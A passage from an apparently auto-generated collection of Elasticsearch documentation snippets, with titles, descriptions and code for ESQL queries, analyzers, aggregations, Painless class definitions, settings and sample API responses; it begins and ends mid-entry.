properties\nCODE:\n```\n-Des.entitlements.policy.x-pack-core=dmVyc2lvbnM6CiAgLSA4LjE4LjAKICAtIDkuMC4wCnBvbGljeToKICB1bmJvdW5kaWQubGRhcHNkazoKICAgIC0gc2V0X2h0dHBzX2Nvbm5lY3Rpb25fcHJvcGVydGllcwogICAgLSBvdXRib3VuZF9uZXR3b3Jr\n```\n\n----------------------------------------\n\nTITLE: Markdown Table - ESQL Type Mapping Documentation\nDESCRIPTION: A markdown table documenting the type compatibility matrix for ESQL functions. Shows the result type (double) for different combinations of base types (double, integer, long, unsigned_long) and number types.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/functions/types/log.md#2025-04-21_snippet_0\n\nLANGUAGE: markdown\nCODE:\n```\n| base | number | result |\n| --- | --- | --- |\n| double | double | double |\n| double | integer | double |\n| double | long | double |\n| double | unsigned_long | double |\n| double | | double |\n| integer | double | double |\n| integer | integer | double |\n| integer | long | double |\n| integer | unsigned_long | double |\n| integer | | double |\n| long | double | double |\n| long | integer | double |\n| long | long | double |\n| long | unsigned_long | double |\n| long | | double |\n| unsigned_long | double | double |\n| unsigned_long | integer | double |\n| unsigned_long | long | double |\n| unsigned_long | unsigned_long | double |\n| unsigned_long | | double |\n```\n\n----------------------------------------\n\nTITLE: Defining Custom Swedish Analyzer in Elasticsearch\nDESCRIPTION: This code snippet illustrates setting up a custom analyzer specifically for Swedish language processing in Elasticsearch, featuring configurations for stopwords, keyword markers, and stemming filters to suit Swedish linguistic requirements. It assumes an Elasticsearch environment with language-specific plugins installed.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/text-analysis/analysis-lang-analyzer.md#2025-04-21_snippet_27\n\nLANGUAGE: console\nCODE:\n```\nPUT /swedish_example\n{\n  \"settings\": {\n    \"analysis\": {\n      \"filter\": {\n        \"swedish_stop\": {\n          \"type\":       \"stop\",\n          \"stopwords\":  \"_swedish_\" <1>\n        },\n        \"swedish_keywords\": {\n          \"type\":       \"keyword_marker\",\n          \"keywords\":   [\"exempel\"] <2>\n        },\n        \"swedish_stemmer\": {\n          \"type\":       \"stemmer\",\n          \"language\":   \"swedish\"\n        }\n      },\n      \"analyzer\": {\n        \"rebuilt_swedish\": {\n          \"tokenizer\":  \"standard\",\n          \"filter\": [\n            \"lowercase\",\n            \"swedish_stop\",\n            \"swedish_keywords\",\n            \"swedish_stemmer\"\n          ]\n        }\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Configuring synthetic _source for annotated-text in Elasticsearch\nDESCRIPTION: Shows how to set up an index with synthetic _source for an annotated-text field, demonstrating default behavior and stored field behavior.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch-plugins/mapper-annotated-text-usage.md#2025-04-21_snippet_3\n\nLANGUAGE: console\nCODE:\n```\nPUT idx\n{\n  \"settings\": {\n    \"index\": {\n      \"mapping\": {\n        \"source\": {\n          \"mode\": \"synthetic\"\n        }\n      }\n    }\n  },\n  \"mappings\": {\n    \"properties\": {\n      \"text\": {\n        \"type\": \"annotated_text\",\n        \"fields\": {\n          \"raw\": {\n            \"type\": \"keyword\"\n          }\n        }\n      }\n    }\n  }\n}\nPUT idx/_doc/1\n{\n  \"text\": [\n    \"the quick brown fox\",\n    \"the quick brown fox\",\n    \"jumped over the lazy dog\"\n  ]\n}\n```\n\nLANGUAGE: console\nCODE:\n```\nPUT idx\n{\n  \"settings\": {\n    \"index\": {\n      \"mapping\": {\n        \"source\": {\n          \"mode\": \"synthetic\"\n        }\n      }\n    }\n  },\n  \"mappings\": {\n    \"properties\": {\n      \"text\": { \"type\": \"annotated_text\", \"store\": true }\n    }\n  }\n}\nPUT idx/_doc/1\n{\n  \"text\": [\n    \"the quick brown fox\",\n    \"the quick brown fox\",\n    \"jumped over the lazy dog\"\n  ]\n}\n```\n\n----------------------------------------\n\nTITLE: Configuring SMTP Local Address in Elasticsearch YAML\nDESCRIPTION: Specifies a local address to use when sending emails. Not configured by default.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/configuration-reference/watcher-settings.md#2025-04-21_snippet_20\n\nLANGUAGE: yaml\nCODE:\n```\nsmtp.local_address\n```\n\n----------------------------------------\n\nTITLE: Example Response with Cumulative Sums\nDESCRIPTION: Shows the response format for a cumulative sum aggregation, including monthly sales figures and their running totals across three months.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/aggregations/search-aggregations-pipeline-cumulative-sum-aggregation.md#2025-04-21_snippet_2\n\nLANGUAGE: json\nCODE:\n```\n{\n   \"took\": 11,\n   \"timed_out\": false,\n   \"_shards\": ...,\n   \"hits\": ...,\n   \"aggregations\": {\n      \"sales_per_month\": {\n         \"buckets\": [\n            {\n               \"key_as_string\": \"2015/01/01 00:00:00\",\n               \"key\": 1420070400000,\n               \"doc_count\": 3,\n               \"sales\": {\n                  \"value\": 550.0\n               },\n               \"cumulative_sales\": {\n                  \"value\": 550.0\n               }\n            },\n            {\n               \"key_as_string\": \"2015/02/01 00:00:00\",\n               \"key\": 1422748800000,\n               \"doc_count\": 2,\n               \"sales\": {\n                  \"value\": 60.0\n               },\n               \"cumulative_sales\": {\n                  \"value\": 610.0\n               }\n            },\n            {\n               \"key_as_string\": \"2015/03/01 00:00:00\",\n               \"key\": 1425168000000,\n               \"doc_count\": 2,\n               \"sales\": {\n                  \"value\": 375.0\n               },\n               \"cumulative_sales\": {\n                  \"value\": 985.0\n               }\n            }\n         ]\n      }\n   }\n}\n```\n\n----------------------------------------\n\nTITLE: Pattern Matching with Double Quote Escaping in ESQL\nDESCRIPTION: Shows how to match literal asterisk character in a string using double quotes and double backslash escaping. The pattern 'foo \\* bar' matches the exact string 'foo * bar'.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/operators/detailedDescription/like.md#2025-04-21_snippet_0\n\nLANGUAGE: esql\nCODE:\n```\nROW message = \"foo * bar\"\n| WHERE message LIKE \"foo \\\\* bar\"\n```\n\n----------------------------------------\n\nTITLE: Initializing Index and Querying Geo-bounds for Geo_shape Fields in Elasticsearch\nDESCRIPTION: This snippet demonstrates creating an index with a geo_shape field, inserting sample data including both point and polygon geometries, and performing a geo-bounds aggregation on the geo_shape field.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/aggregations/search-aggregations-metrics-geobounds-aggregation.md#2025-04-21_snippet_2\n\nLANGUAGE: console\nCODE:\n```\nPUT /places\n{\n  \"mappings\": {\n    \"properties\": {\n      \"geometry\": {\n        \"type\": \"geo_shape\"\n      }\n    }\n  }\n}\n\nPOST /places/_bulk?refresh\n{\"index\":{\"_id\":1}}\n{\"name\": \"NEMO Science Museum\", \"geometry\": \"POINT(4.912350 52.374081)\" }\n{\"index\":{\"_id\":2}}\n{\"name\": \"Sportpark De Weeren\", \"geometry\": { \"type\": \"Polygon\", \"coordinates\": [ [ [ 4.965305328369141, 52.39347642069457 ], [ 4.966979026794433, 52.391721758934835 ], [ 4.969425201416015, 52.39238958618537 ], [ 4.967944622039794, 52.39420969150824 ], [ 4.965305328369141, 52.39347642069457 ] ] ] } }\n\nPOST /places/_search?size=0\n{\n  \"aggs\": {\n    \"viewport\": {\n      \"geo_bounds\": {\n        \"field\": \"geometry\"\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Indexing Parent Documents with Join Field (Object Notation) in Elasticsearch\nDESCRIPTION: Example of creating two parent documents in the 'question' context using the object notation for the join field. This syntax clearly specifies the name of the relation for parent documents.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/mapping-reference/parent-join.md#2025-04-21_snippet_1\n\nLANGUAGE: console\nCODE:\n```\nPUT my-index-000001/_doc/1?refresh\n{\n  \"my_id\": \"1\",\n  \"text\": \"This is a question\",\n  \"my_join_field\": {\n    \"name\": \"question\" <1>\n  }\n}\n\nPUT my-index-000001/_doc/2?refresh\n{\n  \"my_id\": \"2\",\n  \"text\": \"This is another question\",\n  \"my_join_field\": {\n    \"name\": \"question\"\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Checking Geometry Containment with ST_CONTAINS in ESQL\nDESCRIPTION: This ESQL code snippet checks if a given city boundary contains a specified polygon geometry. It filters records based on this condition and retains relevant fields for the output. Prerequisites include having a dataset of airport city boundaries with valid geometry formats. Expected inputs are the geometry of the city boundary and a polygon shape, while the expected output is a filtered set of records with the specified fields.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/kibana/docs/functions/st_contains.md#2025-04-21_snippet_0\n\nLANGUAGE: esql\nCODE:\n```\nFROM airport_city_boundaries\n| WHERE ST_CONTAINS(city_boundary, TO_GEOSHAPE(\"POLYGON((109.35 18.3, 109.45 18.3, 109.45 18.4, 109.35 18.4, 109.35 18.3))\"))\n| KEEP abbrev, airport, region, city, city_location\n```\n\n----------------------------------------\n\nTITLE: Java CharSequence Interface Definition\nDESCRIPTION: Specifies the CharSequence interface with methods for character access, streams, and string operations including Painless-specific augmentations.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/modules/lang-painless/src/main/resources/org/elasticsearch/painless/java.lang.txt#2025-04-21_snippet_1\n\nLANGUAGE: java\nCODE:\n```\nclass java.lang.CharSequence {\n  char charAt(int)\n  IntStream chars()\n  IntStream codePoints()\n  int length()\n  String org.elasticsearch.painless.api.Augmentation replaceAll(Pattern,Function)\n  String org.elasticsearch.painless.api.Augmentation replaceFirst(Pattern,Function)\n  CharSequence subSequence(int,int)\n  String toString()\n}\n```\n\n----------------------------------------\n\nTITLE: Using LEFT Function with ESQL\nDESCRIPTION: Demonstrates how to extract the first 3 characters from employee last names using the LEFT function in ESQL. The query keeps only the last_name column and creates a new column 'left' containing the first 3 characters of each last name.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/functions/examples/left.md#2025-04-21_snippet_0\n\nLANGUAGE: esql\nCODE:\n```\nFROM employees\n| KEEP last_name\n| EVAL left = LEFT(last_name, 3)\n```\n\n----------------------------------------\n\nTITLE: Import Node Certificate to Client Keystore\nDESCRIPTION: Imports the node's certificate into the client's keystore for trust\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/build-tools-internal/src/main/resources/test/ssl/README.md#2025-04-21_snippet_3\n\nLANGUAGE: bash\nCODE:\n```\nkeytool -import -alias test-node -keystore test-client.jks -storepass keypass -file test-node.crt -noprompt\n```\n\n----------------------------------------\n\nTITLE: HDFS Repository Plugin Configuration Note for Windows Users\nDESCRIPTION: This note provides guidance for Windows users attempting to use Apache Hadoop with the HDFS plugin. It advises on placing 'winutils.exe' in the plugin folder and setting the HADOOP_HOME environment variable to minimize permission requirements.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch-plugins/repository-hdfs-usage.md#2025-04-21_snippet_0\n\nLANGUAGE: markdown\nCODE:\n```\nWindows Users\n:   Using Apache Hadoop on Windows is problematic and thus it is not recommended. For those *really* wanting to use it, make sure you place the elusive `winutils.exe` under the plugin folder and point `HADOOP_HOME` variable to it; this should minimize the amount of permissions Hadoop requires (though one would still have to add some more).\n```\n\n----------------------------------------\n\nTITLE: Indexing WKT MultiLineString in Elasticsearch\nDESCRIPTION: Example of indexing a WKT (Well-Known Text) MultiLineString in Elasticsearch. The 'location' field contains a string representation of multiple linestrings using the WKT format.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/mapping-reference/shape.md#2025-04-21_snippet_13\n\nLANGUAGE: json\nCODE:\n```\nPOST /example/_doc\n{\n  \"location\" : \"MULTILINESTRING ((1002.0 200.0, 1003.0 200.0, 1003.0 300.0, 1002.0 300.0), (1000.0 100.0, 1001.0 100.0, 1001.0 100.0, 1000.0 100.0), (1000.2 0.2, 1000.8 100.2, 1000.8 100.8, 1000.2 100.8))\"\n}\n```\n\n----------------------------------------\n\nTITLE: Reroute Processor with Fallback Values\nDESCRIPTION: Configuration example showing how to set up fallback values for dataset and namespace in the reroute processor.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/enrich-processor/reroute-processor.md#2025-04-21_snippet_2\n\nLANGUAGE: javascript\nCODE:\n```\n{\n  \"reroute\": {\n    \"dataset\": [\n        \"{{service.name}}\",\n        \"generic\"\n    ],\n    \"namespace\": \"default\"\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Generating Two Ranges on a Single Field Query in Elasticsearch\nDESCRIPTION: This snippet shows how to create a query with two range conditions on a single field in Elasticsearch. It uses separate range queries for the pid field to handle multi-value scenarios.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/x-pack/plugin/eql/src/test/resources/querytranslator_tests.txt#2025-04-21_snippet_28\n\nLANGUAGE: eql\nCODE:\n```\nprocess where pid > 100 and pid < 200\n```\n\nLANGUAGE: json\nCODE:\n```\n{\"bool\":{\"must\":[{\"range\":{\"pid\":{\"gt\":100}}},{\"range\":{\"pid\":{\"lt\":200}}}]}}\n```\n\n----------------------------------------\n\nTITLE: Configuring Data Stream Lifecycle Poll Interval\nDESCRIPTION: Dynamic setting that determines how often Elasticsearch checks for next actions on data streams. Defaults to 5 minutes.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/configuration-reference/data-stream-lifecycle-settings.md#2025-04-21_snippet_2\n\nLANGUAGE: yaml\nCODE:\n```\ndata_streams.lifecycle.poll_interval: 5m\n```\n\n----------------------------------------\n\nTITLE: Dropbox Advanced Sync Rules - File Category Filter\nDESCRIPTION: Advanced sync rules example with file category filtering\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/search-connectors/es-connectors-dropbox.md#2025-04-21_snippet_8\n\nLANGUAGE: js\nCODE:\n```\n[\n  {\n    \"query\": \"test\",\n    \"options\": {\n      \"file_categories\": [\n        {\n          \".tag\": \"paper\"\n        },\n        {\n          \".tag\": \"png\"\n        }\n      ]\n    }\n  }\n]\n```\n\n----------------------------------------\n\nTITLE: Defining Package for ESL Unit Test in Java\nDESCRIPTION: This code snippet defines the package for an Elasticsearch unit test class. It specifies the package name and includes copyright information in the package-level documentation.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/modules/repository-gcs/licenses/grpc-api-NOTICE.txt#2025-04-21_snippet_0\n\nLANGUAGE: Java\nCODE:\n```\n/*\n * Copyright Elasticsearch B.V. and/or licensed to Elasticsearch B.V. under one\n * or more contributor license agreements. Licensed under the Elastic License\n * 2.0 and the Server Side Public License, v 1; you may not use this file except\n * in compliance with, at your election, the Elastic License 2.0 or the Server\n * Side Public License, v 1.\n */\n\npackage org.elasticsearch.ingest.geoip;\n```\n\n----------------------------------------\n\nTITLE: Response from Variable Width Histogram Aggregation in Elasticsearch\nDESCRIPTION: This snippet shows the expected response format from a variable width histogram aggregation in Elasticsearch, including bucket information with min, max, key, and doc_count.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/aggregations/search-aggregations-bucket-variablewidthhistogram-aggregation.md#2025-04-21_snippet_1\n\nLANGUAGE: console-result\nCODE:\n```\n{\n  ...\n  \"aggregations\": {\n    \"prices\": {\n      \"buckets\": [\n        {\n          \"min\": 10.0,\n          \"key\": 30.0,\n          \"max\": 50.0,\n          \"doc_count\": 2\n        },\n        {\n          \"min\": 150.0,\n          \"key\": 185.0,\n          \"max\": 200.0,\n          \"doc_count\": 5\n        }\n      ]\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Retrieving Authenticated User with USER() Function in Elasticsearch SQL\nDESCRIPTION: The USER() function returns the username of the currently authenticated user executing the query. Takes no input parameters and returns a string value, which can be null if security is disabled.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/sql/sql-functions-system.md#2025-04-21_snippet_1\n\nLANGUAGE: sql\nCODE:\n```\nUSER()\n```\n\nLANGUAGE: sql\nCODE:\n```\nSELECT USER();\n\n     USER\n---------------\nelastic\n```\n\n----------------------------------------\n\nTITLE: Executing an RRF Search with Standard and kNN Retrievers in Elasticsearch\nDESCRIPTION: Performs a search using the Reciprocal Rank Fusion (RRF) retriever, combining a standard BM25 text query and a kNN vector search, with additional terms aggregation.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/rest-apis/reciprocal-rank-fusion.md#2025-04-21_snippet_4\n\nLANGUAGE: console\nCODE:\n```\nGET example-index/_search\n{\n    \"retriever\": {\n        \"rrf\": {\n            \"retrievers\": [\n                {\n                    \"standard\": {\n                        \"query\": {\n                            \"term\": {\n                                \"text\": \"rrf\"\n                            }\n                        }\n                    }\n                },\n                {\n                    \"knn\": {\n                        \"field\": \"vector\",\n                        \"query_vector\": [3],\n                        \"k\": 5,\n                        \"num_candidates\": 5\n                    }\n                }\n            ],\n            \"rank_window_size\": 5,\n            \"rank_constant\": 1\n        }\n    },\n    \"size\": 3,\n    \"aggs\": {\n        \"int_count\": {\n            \"terms\": {\n                \"field\": \"integer\"\n            }\n        }\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Storage Decider Service Parameters\nDESCRIPTION: Configuration parameters showing default forecast window (30 minutes) used by ProactiveStorageDeciderService for managing data streams and predicting resource needs.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/internal/DistributedArchitectureGuide.md#2025-04-21_snippet_2\n\nLANGUAGE: java\nCODE:\n```\n// Default forecast window setting\nstatic final TimeValue DEFAULT_FORECAST_WINDOW = TimeValue.timeValueMinutes(30);\n```\n\n----------------------------------------\n\nTITLE: Linked List Class Definition in Java\nDESCRIPTION: This snippet defines the LinkedList class, which provides a doubly linked list implementation of the List interface. It allows for dynamic memory allocation of elements and various list operations.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/modules/lang-painless/src/main/resources/org/elasticsearch/painless/java.util.txt#2025-04-21_snippet_26\n\nLANGUAGE: Java\nCODE:\n```\nclass java.util.LinkedList {\n  ()\n  (Collection)\n  def clone()\n}\n```\n\n----------------------------------------\n\nTITLE: Using Multiline Regex Flag in Painless\nDESCRIPTION: Demonstrates the use of the multiline flag 'm' in a Painless regex pattern. This example checks if 'b' is at the start of any line in a multiline string.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/scripting-languages/painless/painless-regexes.md#2025-04-21_snippet_2\n\nLANGUAGE: painless\nCODE:\n```\n'a\\nb\\nc' =~ /^b$/m\n```\n\n----------------------------------------\n\nTITLE: Installing HDFS Repository Plugin in Elasticsearch\nDESCRIPTION: Command to install the repository-hdfs plugin using Elasticsearch's plugin manager. Must be run with sudo privileges and requires node restart after installation.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch-plugins/repository-hdfs.md#2025-04-21_snippet_0\n\nLANGUAGE: sh\nCODE:\n```\nsudo bin/elasticsearch-plugin install repository-hdfs\n```\n\n----------------------------------------\n\nTITLE: Querying Elasticsearch with Runtime Field and Frequent Items Aggregation\nDESCRIPTION: This query creates a runtime field 'price_range' based on 'taxful_total_price', and uses it in a frequent items aggregation along with category and city name. It demonstrates how to analyze numeric values by grouping them into price ranges.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/aggregations/search-aggregations-bucket-frequent-item-sets-aggregation.md#2025-04-21_snippet_4\n\nLANGUAGE: console\nCODE:\n```\nGET kibana_sample_data_ecommerce/_search\n{\n  \"runtime_mappings\": {\n    \"price_range\": {\n      \"type\": \"keyword\",\n      \"script\": {\n        \"source\": \"\"\"\n           def bucket_start = (long) Math.floor(doc['taxful_total_price'].value / 50) * 50;\n           def bucket_end = bucket_start + 50;\n           emit(bucket_start.toString() + \"-\" + bucket_end.toString());\n        \"\"\"\n      }\n    }\n  },\n  \"size\": 0,\n  \"aggs\": {\n    \"my_agg\": {\n      \"frequent_item_sets\": {\n        \"minimum_set_size\": 4,\n        \"fields\": [\n          {\n            \"field\": \"category.keyword\"\n          },\n          {\n            \"field\": \"price_range\"\n          },\n          {\n            \"field\": \"geoip.city_name\"\n          }\n        ],\n        \"size\": 3\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: SQL Log Base 10 Function Description\nDESCRIPTION: Documentation for the SQL LOG10 function that calculates logarithms with base 10. The function accepts numeric inputs and returns double values. When the input is 0 or negative, the function returns null and generates a warning.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/functions/description/log10.md#2025-04-21_snippet_0\n\nLANGUAGE: sql\nCODE:\n```\n% This is generated by ESQL's AbstractFunctionTestCase. Do no edit it. See ../README.md for how to regenerate it.\n```\n\n----------------------------------------\n\nTITLE: Determining Minimum Bounding Box using ESQL\nDESCRIPTION: This ESQL snippet calculates the minimum bounding box for a city boundary using the ST_ENVELOPE function. It filters data from airport city boundaries where the abbreviation is 'CPH' and keeps specific fields including the calculated envelope. There are no required dependencies, but it assumes access to a dataset named 'airport_city_boundaries'. The input is a row from the dataset, and the output is the abbreviation, airport name, and the calculated envelope of the city boundary.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/kibana/docs/functions/st_envelope.md#2025-04-21_snippet_0\n\nLANGUAGE: esql\nCODE:\n```\nFROM airport_city_boundaries\n| WHERE abbrev == \"CPH\"\n| EVAL envelope = ST_ENVELOPE(city_boundary)\n| KEEP abbrev, airport, envelope\n```\n\n----------------------------------------\n\nTITLE: Configuring and Using ja_stop Token Filter with Kuromoji in Elasticsearch\nDESCRIPTION: This snippet demonstrates how to configure a custom analyzer with the ja_stop token filter to remove Japanese stopwords and a custom stopword. It creates an index with a custom analyzer and then tests it using the _analyze endpoint to show how the stopword 'ストップ' gets filtered out.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch-plugins/analysis-kuromoji-stop.md#2025-04-21_snippet_0\n\nLANGUAGE: console\nCODE:\n```\nPUT kuromoji_sample\n{\n  \"settings\": {\n    \"index\": {\n      \"analysis\": {\n        \"analyzer\": {\n          \"analyzer_with_ja_stop\": {\n            \"tokenizer\": \"kuromoji_tokenizer\",\n            \"filter\": [\n              \"ja_stop\"\n            ]\n          }\n        },\n        \"filter\": {\n          \"ja_stop\": {\n            \"type\": \"ja_stop\",\n            \"stopwords\": [\n              \"_japanese_\",\n              \"ストップ\"\n            ]\n          }\n        }\n      }\n    }\n  }\n}\n\nGET kuromoji_sample/_analyze\n{\n  \"analyzer\": \"analyzer_with_ja_stop\",\n  \"text\": \"ストップは消える\"\n}\n```\n\n----------------------------------------\n\nTITLE: Defining IllegalAccessException in Java\nDESCRIPTION: This snippet defines the java.lang.IllegalAccessException class, thrown when an application tries to reflectively create an instance or set/get a field, or call a method that it does not have access to. It includes a default constructor and a constructor that accepts a string message.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/modules/lang-painless/src/main/resources/org/elasticsearch/painless/java.lang.txt#2025-04-21_snippet_34\n\nLANGUAGE: java\nCODE:\n```\nclass java.lang.IllegalAccessException {\n  ()\n  (String)\n}\n```\n\n----------------------------------------\n\nTITLE: Indexing documents with geo_point fields\nDESCRIPTION: This snippet demonstrates creating an index in Elasticsearch with documents containing a geo_point field. Use the PUT HTTP method to create and add documents with geo_point data to the index. Parameters include index name and the location representing geo coordinates as a POINT.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/query-dsl/query-dsl-geo-grid-query.md#2025-04-21_snippet_0\n\nLANGUAGE: Elasticsearch\nCODE:\n```\nPUT /my_locations\n{\n  \"mappings\": {\n    \"properties\": {\n      \"location\": {\n        \"type\": \"geo_point\"\n      }\n    }\n  }\n}\n\nPUT /my_locations/_doc/1?refresh\n{\n  \"location\" : \"POINT(4.912350 52.374081)\",\n  \"city\": \"Amsterdam\",\n  \"name\": \"NEMO Science Museum\"\n}\n\nPUT /my_locations/_doc/2?refresh\n{\n  \"location\" : \"POINT(4.405200 51.222900)\",\n  \"city\": \"Antwerp\",\n  \"name\": \"Letterenhuis\"\n}\n\nPUT /my_locations/_doc/3?refresh\n{\n  \"location\" : \"POINT(2.336389 48.861111)\",\n  \"city\": \"Paris\",\n  \"name\": \"Musée du Louvre\"\n}\n```\n\n----------------------------------------\n\nTITLE: Capturing Run As Granted Event in Elasticsearch\nDESCRIPTION: Example JSON audit log entry for when a run-as authentication request is granted. Shows successful impersonation of one user by another with superuser privileges.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/elasticsearch-audit-events.md#2025-04-21_snippet_18\n\nLANGUAGE: json\nCODE:\n```\n{\"type\":\"audit\", \"timestamp\":\"2020-12-30T22:44:42,068+0200\", \"node.id\": \"0RMNyghkQYCc_gVd1G6tZQ\", \"event.type\":\"transport\", \"event.action\": \"run_as_granted\", \"user.name\":\"elastic\", \"user.run_as.name\":\"user1\", \"user.realm\":\"reserved\", \"user.run_as.realm\":\"default_native\", \"user.roles\":[\"superuser\"], \"origin.type\":\"rest\", \"origin.address\": \"[::1]:52623\", \"request.id\":\"dGqPTdEQSX2TAPS3cvc1qA\", \"action\": \"indices:data/read/search\", \"request.name\":\"SearchRequest\", \"indices\":[\"alias1\"]}\n```\n\n----------------------------------------\n\nTITLE: Simple Pattern Tokenizer Output Example\nDESCRIPTION: The output example shows the terms produced by the simple pattern tokenizer when configured to recognize three-digit numbers. This output is generated from the previously configured Elasticsearch analyzer.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/text-analysis/analysis-simplepattern-tokenizer.md#2025-04-21_snippet_1\n\nLANGUAGE: text\nCODE:\n```\n[ 786, 335, 514 ]\n```\n\n----------------------------------------\n\nTITLE: Adding Time Intervals in Elasticsearch SQL\nDESCRIPTION: Example showing how to add time intervals using the + operator to combine days and minutes.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/sql/sql-functions-datetime.md#2025-04-21_snippet_2\n\nLANGUAGE: sql\nCODE:\n```\nSELECT INTERVAL 1 DAY + INTERVAL 53 MINUTES AS result;\n\n    result\n---------------\n+1 00:53:00\n```\n\n----------------------------------------\n\nTITLE: Creating Index and Inserting Point Data for Cartesian-bounds Aggregation\nDESCRIPTION: This snippet demonstrates creating an index with a Point field and inserting sample museum data for use with the cartesian-bounds aggregation.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/aggregations/search-aggregations-metrics-cartesian-bounds-aggregation.md#2025-04-21_snippet_0\n\nLANGUAGE: console\nCODE:\n```\nPUT /museums\n{\n  \"mappings\": {\n    \"properties\": {\n      \"location\": {\n        \"type\": \"point\"\n      }\n    }\n  }\n}\n\nPOST /museums/_bulk?refresh\n{\"index\":{\"_id\":1}}\n{\"location\": \"POINT (491.2350 5237.4081)\", \"city\": \"Amsterdam\", \"name\": \"NEMO Science Museum\"}\n{\"index\":{\"_id\":2}}\n{\"location\": \"POINT (490.1618 5236.9219)\", \"city\": \"Amsterdam\", \"name\": \"Museum Het Rembrandthuis\"}\n{\"index\":{\"_id\":3}}\n{\"location\": \"POINT (491.4722 5237.1667)\", \"city\": \"Amsterdam\", \"name\": \"Nederlands Scheepvaartmuseum\"}\n{\"index\":{\"_id\":4}}\n{\"location\": \"POINT (440.5200 5122.2900)\", \"city\": \"Antwerp\", \"name\": \"Letterenhuis\"}\n{\"index\":{\"_id\":5}}\n{\"location\": \"POINT (233.6389 4886.1111)\", \"city\": \"Paris\", \"name\": \"Musée du Louvre\"}\n{\"index\":{\"_id\":6}}\n{\"location\": \"POINT (232.7000 4886.0000)\", \"city\": \"Paris\", \"name\": \"Musée d'Orsay\"}\n```\n\n----------------------------------------\n\nTITLE: Running Specific Benchmark Class\nDESCRIPTION: Example of running a specific benchmark class (MemoryStatsBenchmark) using Gradle command\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/benchmarks/README.md#2025-04-21_snippet_0\n\nLANGUAGE: bash\nCODE:\n```\ngradlew -p benchmarks run --args 'MemoryStatsBenchmark'\n```\n\n----------------------------------------\n\nTITLE: Uppercase Conversion Method in Painless\nDESCRIPTION: This method signature shows how to use the uppercase processor to convert a string to its uppercase equivalent.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/scripting-languages/painless/using-ingest-processors-in-painless.md#2025-04-21_snippet_3\n\nLANGUAGE: painless\nCODE:\n```\nString uppercase(String value);\n```\n\n----------------------------------------\n\nTITLE: Extended Stats Bucket Aggregation Response Example\nDESCRIPTION: Shows the response format for an extended stats bucket aggregation, including various statistical measures like count, min, max, average, sum, variance, and standard deviation bounds.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/aggregations/search-aggregations-pipeline-extended-stats-bucket-aggregation.md#2025-04-21_snippet_2\n\nLANGUAGE: console\nCODE:\n```\n{\n   \"took\": 11,\n   \"timed_out\": false,\n   \"_shards\": ...,\n   \"hits\": ...,\n   \"aggregations\": {\n      \"sales_per_month\": {\n         \"buckets\": [\n            {\n               \"key_as_string\": \"2015/01/01 00:00:00\",\n               \"key\": 1420070400000,\n               \"doc_count\": 3,\n               \"sales\": {\n                  \"value\": 550.0\n               }\n            },\n            {\n               \"key_as_string\": \"2015/02/01 00:00:00\",\n               \"key\": 1422748800000,\n               \"doc_count\": 2,\n               \"sales\": {\n                  \"value\": 60.0\n               }\n            },\n            {\n               \"key_as_string\": \"2015/03/01 00:00:00\",\n               \"key\": 1425168000000,\n               \"doc_count\": 2,\n               \"sales\": {\n                  \"value\": 375.0\n               }\n            }\n         ]\n      },\n      \"stats_monthly_sales\": {\n         \"count\": 3,\n         \"min\": 60.0,\n         \"max\": 550.0,\n         \"avg\": 328.3333333333333,\n         \"sum\": 985.0,\n         \"sum_of_squares\": 446725.0,\n         \"variance\": 41105.55555555556,\n         